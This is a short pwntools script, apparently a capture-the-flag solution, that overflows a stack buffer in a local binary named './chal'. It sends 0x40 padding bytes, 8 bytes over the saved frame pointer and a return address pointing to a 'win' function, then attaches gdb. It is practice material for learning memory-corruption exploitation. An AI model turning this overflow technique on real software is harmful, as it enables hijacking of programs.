from pwn import * 

s = '''
'''

binary = './chal'
p = process(binary)

win = 0x40123b
payload = b'A' * 0x40
payload += b'B' * 8
payload += p64(win)

p.sendline(payload)
gdb.attach(p, s)


p.interactive()
